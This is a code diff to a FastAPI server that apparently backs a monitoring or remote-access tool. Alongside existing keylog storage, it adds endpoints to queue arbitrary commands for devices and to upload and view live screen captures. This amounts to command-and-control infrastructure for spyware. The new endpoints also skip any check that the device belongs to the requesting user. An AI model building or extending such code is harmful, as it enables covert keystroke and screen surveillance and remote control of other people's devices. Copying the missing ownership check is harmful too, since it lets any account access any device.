@@ -1,4 +1,5 @@
-from fastapi import APIRouter, Depends, HTTPException, File, UploadFile, Form
+from fastapi import APIRouter, Depends, HTTPException, File, UploadFile, Form, Response
+import time
 import shutil
 import os
 import uuid
@@ -6,10 +7,12 @@ from typing import List, Optional
 from fastapi.security import OAuth2PasswordRequestForm
 from sqlalchemy.orm import Session
 from . import schemas
-from app.db import crud, models
+from app.db import crud, models, database
 from app.db.database import get_db
 from app.core import security
 from app.core.auth import get_current_user, get_current_device
+security.get_current_user = get_current_user
+security.verify_device_token = get_current_device
 from datetime import timedelta
 from app.core.config import settings
 from sqlalchemy.sql import func
@@ -278,4 +281,48 @@ def create_keylog_for_device(
     keylog.device_id = current_device.id
     return crud.create_user_keylog(db=db, keylog=keylog, user_id=current_device.owner_id)
 
+@router.post("/commands", response_model=schemas.CommandResponse)
+def enqueue_command(
+    cmd_req: schemas.CommandCreateRequest,
+    db: Session = Depends(database.get_db),
+    current_user: models.User = Depends(security.get_current_user)
+):
+    cmd = models.Command(
+        device_id=cmd_req.device_id,
+        command=cmd_req.command,
+        status="PENDING",
+        created_at=int(time.time() * 1000)
+    )
+    db.add(cmd)
+    db.commit()
+    db.refresh(cmd)
+    return cmd
 
+@router.post("/live-screen")
+def upload_live_screen_frame(
+    file: UploadFile = File(...),
+    timestamp: int = Form(...),
+    db: Session = Depends(database.get_db),
+    device: models.Device = Depends(security.verify_device_token)
+):
+    frame_bytes = file.file.read()
+    frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device.id).first()
+    if not frame:
+        frame = models.LiveScreenFrame(device_id=device.id, frame_data=frame_bytes, timestamp=timestamp)
+        db.add(frame)
+    else:
+        frame.frame_data = frame_bytes
+        frame.timestamp = timestamp
+    db.commit()
+    return {"status": "ok"}
+
+@router.get("/live-screen/latest")
+def get_latest_live_frame(
+    device_id: int,
+    db: Session = Depends(database.get_db),
+    current_user: models.User = Depends(security.get_current_user)
+):
+    frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device_id).first()
+    if not frame or not frame.frame_data:
+        return Response(status_code=404)
+    return Response(content=frame.frame_data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(frame.timestamp)})
